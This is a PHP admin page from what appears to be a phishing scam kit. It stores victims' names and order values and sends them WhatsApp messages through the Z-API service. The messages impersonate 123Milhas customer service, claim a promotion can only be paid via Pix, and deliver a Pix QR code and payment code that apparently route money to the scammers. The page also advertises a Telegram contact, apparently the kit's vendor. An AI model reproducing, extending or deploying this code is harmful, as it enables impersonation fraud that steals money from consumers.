<?php
   session_start();
   include 'config.php';
   ini_set('display_errors', 0);
   ini_set('display_startup_errors', 0);
   error_reporting(0);
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['acao'])) {
       if ($_POST['acao'] === 'deletar' && isset($_POST['id'])) {
           $id = (int)$_POST['id'];
           $stmt = $conn->prepare("DELETE FROM enviar_whatsapp WHERE id = ?");
           $stmt->bind_param("i", $id);
           
           if ($stmt->execute()) {
               echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.success("Registro deletado com sucesso!");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
           } else {
               echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Erro ao excluir o registro do banco de dados");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
           }
           $stmt->close();
       }
   
       if ($_POST['acao'] === 'enviar_zap' && isset($_POST['id'])) {
           $id = (int)$_POST['id'];
           $stmt = $conn->prepare("SELECT * FROM enviar_whatsapp WHERE id = ?");
           $stmt->bind_param("i", $id);
           $stmt->execute();
           $dados = $stmt->get_result()->fetch_assoc();
           $stmt->close();
   
           if (!$dados) {
               echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Registro não encontrado!");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
           } else {
               $nome = $dados['nome'];
               $payload = $dados['pix'];
               $whatsapp = preg_replace('/[^0-9]/', '', $dados['telefone']);
               
               if ($whatsapp && substr($whatsapp, 0, 2) !== '55') {
                   $whatsapp = '55' . $whatsapp;
               }
   
               $stmt_token = $conn->prepare("SELECT instance_id, token, token_seguranca FROM token_zap WHERE id = 1");
               $stmt_token->execute();
               $token_result = $stmt_token->get_result();
               
               if ($token_result->num_rows === 0) {
                   echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Tokens do WhatsApp não configurados!");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
                   $stmt_token->close();
               }
               
               $token_data = $token_result->fetch_assoc();
               $stmt_token->close();
               
               $instance_id = $token_data['instance_id'];
               $token = $token_data['token'];
               $token_seguranca = $token_data['token_seguranca'];
   
               if (empty($instance_id) || empty($token) || empty($token_seguranca)) {
                   echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Token do WhatsApp não configurado!");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
               } else {
                   $mensagem1 = "Olá $nome, devido a altas taxas bancárias essa promoção só é válida para pagamento via Pix\n\nCaso tenha alguma dúvida basta nos enviar uma mensagem que lhe ajudaremos o mais rápido possivel.\n\nAtenciosamente SAC 123Milhas.\n\nPague com Pix lendo o QR Code ou com o código Pix Copia e Cola";
                   $mensagem2 = "Qrcode 👆\nPix Copia e cola 👇";
                   $mensagem3 = $payload;
                   
                   $url_base = "https://api.z-api.io/instances/$instance_id/token/$token";
   
                   $url_msg = $url_base . "/send-text";
                   $data_msg = [
                       "phone" => $whatsapp,
                       "message" => $mensagem1
                   ];
   
                   $payload_msg = json_encode($data_msg);
                   $ch_msg = curl_init($url_msg);
                   curl_setopt($ch_msg, CURLOPT_HTTPHEADER, [
                       'Content-Type: application/json',
                       "Client-Token: $token_seguranca"
                   ]);
                   curl_setopt($ch_msg, CURLOPT_POST, true);
                   curl_setopt($ch_msg, CURLOPT_POSTFIELDS, $payload_msg);
                   curl_setopt($ch_msg, CURLOPT_RETURNTRANSFER, true);
                   $response_msg = curl_exec($ch_msg);
                   $httpCode_msg = curl_getinfo($ch_msg, CURLINFO_HTTP_CODE);
                   curl_close($ch_msg);
   
                   if ($httpCode_msg == 200 || $httpCode_msg == 201) {
                       sleep(1);
   
                       if (!empty($dados['qrcode'])) {
                           $qrcode = $dados['qrcode'];
                           $url_img = "https://api.z-api.io/instances/$instance_id/token/$token/send-image";
                           $ch_img = curl_init($url_img);
                           curl_setopt($ch_img, CURLOPT_HTTPHEADER, [
                               'Content-Type: application/json',
                               "Client-Token: $token_seguranca"
                           ]);
                           curl_setopt($ch_img, CURLOPT_POST, true);
                           curl_setopt($ch_img, CURLOPT_POSTFIELDS, json_encode([
                               "phone" => $whatsapp,
                               "image" => $qrcode,
                               "caption" => $mensagem2
                           ]));
                           curl_setopt($ch_img, CURLOPT_RETURNTRANSFER, true);
                           $response_img = curl_exec($ch_img);
                           $httpCode_img = curl_getinfo($ch_img, CURLINFO_HTTP_CODE);
                           
                           if ($httpCode_img == 200 || $httpCode_img == 201) {
                               $success_img = true;
                           } else {
                               file_put_contents("erro.txt", "Erro Imagem (HTTP $httpCode_img): " . $response_img . PHP_EOL, FILE_APPEND);
                           }
                           curl_close($ch_img);
                           
                           sleep(1);
                       }
   
                       $data_msg3 = [
                           "phone" => $whatsapp,
                           "message" => $mensagem3
                       ];
                       
                       $payload_msg3 = json_encode($data_msg3);
                       $ch_msg3 = curl_init($url_msg);
                       curl_setopt($ch_msg3, CURLOPT_HTTPHEADER, [
                           'Content-Type: application/json',
                           "Client-Token: $token_seguranca"
                       ]);
                       curl_setopt($ch_msg3, CURLOPT_POST, true);
                       curl_setopt($ch_msg3, CURLOPT_POSTFIELDS, $payload_msg3);
                       curl_setopt($ch_msg3, CURLOPT_RETURNTRANSFER, true);
                       $response_msg3 = curl_exec($ch_msg3);
                       $httpCode_msg3 = curl_getinfo($ch_msg3, CURLINFO_HTTP_CODE);
                       curl_close($ch_msg3);
   
                       if ($httpCode_msg3 == 200 || $httpCode_msg3 == 201) {
                           $stmtUpdate = $conn->prepare("UPDATE enviar_whatsapp SET status = 'Enviado' WHERE id = ?");
                           $stmtUpdate->bind_param("i", $id);
                           $stmtUpdate->execute();
                           $stmtUpdate->close();
   
                           echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.success("Mensagem enviada com sucesso!");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
                       } else {
                           echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Erro ao enviar o código PIX via WhatsApp API");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
                       }
                   } else {
                       echo '<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
       <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
       <script>
           $(function() {
               toastr.options.timeOut = 7000;
               toastr.options.closeButton = true;
               toastr.options.positionClass = "toast-top-right";
               toastr.error("Erro ao enviar a primeira mensagem via WhatsApp API");
               setTimeout(function() {
                   window.location.href = "?COMON=/ADMIN&acesso=ENVIAR_WHATSAPP";
               }, 7000);
           });
       </script>';
                   }
               }
           }
       }
   }
   
   $sql = "SELECT id, nome, pedido, valor, status FROM enviar_whatsapp ORDER BY id DESC";
   $result = $conn->query($sql);
   $temResultados = $result && $result->num_rows > 0;
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
      <div class="block-header">
         <div class="row clearfix">
            <div class="col-lg-4 col-md-12 col-sm-12">
               <h1>Olá  admin, você está em  / Enviar Whatsapp</h1>
               <span>TXT_JPGI1 - @TXT_JPGI1 &lt;== no telegram! </span>
            </div>
         </div>
      </div>
      <div class="col-lg-12">
         <div class="card">
            <div class="card-header">
               <strong class="card-title">Envios de Whatsapp &nbsp;</strong>
            </div>
            <div class="table-stats order-table">
               <div class="table-responsive" style="overflow-x:auto; -webkit-overflow-scrolling:touch;">
                  <table class="table table-striped table-bordered" style="min-width: 1000px; white-space: nowrap;">
                     <thead>
                        <tr>
                           <th>Nome</th>
                           <th>Pedido</th>
                           <th>Valor</th>
                           <th>Status</th>
                           <th>Enviar Whatsapp</th>
                           <th>Deletar</th>
                        </tr>
                     </thead>
                     <tbody>
                        <?php if ($temResultados): ?><?php while ($row = $result->fetch_assoc()): ?>
                        <tr>
                           <td><?= htmlspecialchars($row['nome']) ?></td>
                           <td><?= htmlspecialchars($row['pedido']) ?></td>
                           <td>R$ <?= number_format((float)$row['valor'], 2, ',', '.') ?></td>
                           <td><?php if ($row['status'] === 'Enviado'): ?><span class="badge badge-success">Enviado</span><?php else: ?><span class="badge badge-warning">Pendente</span><?php endif; ?></td>
                           <td>
                              <?php if ($row['status'] !== 'Enviado'): ?>
                              <form method="post" action="" style="margin:0;"><input type="hidden" name="acao" value="enviar_zap"><input type="hidden" name="id" value="<?= (int)$row['id'] ?>"><button type="submit" class="btn btn-sm btn-success">Enviar Whatsapp</button></form>
                              <?php else: ?> - <?php endif; ?>
                           </td>
                           <td>
                              <form method="post" action="" style="margin:0; display:inline;"><input type="hidden" name="acao" value="deletar"><input type="hidden" name="id" value="<?= (int)$row['id'] ?>"><button type="submit" class="btn btn-sm btn-danger" title="Deletar"><i class="fa fa-trash"></i></button></form>
                           </td>
                        </tr>
                        <?php endwhile; ?>
                        <?php else: ?>
                        <tr>
                           <td colspan="7" class="text-center">Nenhum envio encontrado.</td>
                        </tr>
                        <?php endif; ?>
                     </tbody>
                  </table>
               </div>
            </div>
         </div>
      </div>